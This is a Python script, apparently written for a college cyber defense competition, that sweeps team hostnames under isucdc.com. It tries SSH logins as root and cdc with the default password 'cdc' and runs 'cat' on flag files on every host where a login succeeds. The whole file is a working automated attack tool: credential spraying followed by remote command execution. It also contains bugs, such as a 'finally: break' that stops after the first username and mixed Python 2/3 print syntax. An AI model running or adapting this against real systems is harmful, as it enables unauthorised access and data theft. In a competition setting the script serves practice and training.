#!/usr/bin/python

import os
import sys
import paramiko

userList = [ "root", "cdc" ]
machines = [ ["ipa","/etc/*flag"] , ["traffic", "/srv/*flag"],["www", "/srv/*flag"], ["security", "/opt/local/etc/*flag"], ["baggage", "/root/*flag"] ]
numTeams = 20

paramiko.util.log_to_file("demo_simple.log")
#paramiko.client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy)
#sshClient = paramiko.client.SSHClient()

def parseName(machineName):
    name = machineName.split(".")
    print(name[0])
    return(name[0])

def captureFlag(machineName, machineIndex, sshclient):
    filename = machines[machineIndex][1]
    command = "cat " + filename
    print(command)
    ssh_stdin, ssh_stdout, ssh_stderr = sshclient.exec_command(command)
    print("Flag from " + machineName + ": ")
    print(ssh_stdout.readlines())



def tryDefaultCreds(machineName, machineIndex):
    print("Trying to ssh to " + machineName)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy())
    sshClient = client
    for user in userList:
        try:
            sshClient.connect(machineName, port=22, username=user, password="cdc", timeout=60)
            print("default creds worked for user " + user)
            captureFlag(machineName,machineIndex, sshClient)
            sshClient.close()
            break
        except paramiko.SSHException as e:
            print("connection failed")
            print(e)
        finally:
            break
    print()

def findMachines():
    for n in range(1,30):
        index = 0
        for machine in machines[:]:
            print("searching for "+ machine[0] + " in team" + str(n))
            machineName = machine[0] + ".team" + str(n) + ".isucdc.com"
            print machineName
            tryDefaultCreds(machineName, index)

            index += 1
            #response = pyping.ping(machineName)
            #if response.ret_code == 0:
            #    print("reachable")
            #    tryDefaultCreds(machineName)
            #else:
            #    print("unreachable")



def main():
    print("Running 2019 autopwn script\n")
    findMachines()


if __name__ == '__main__':
    main()
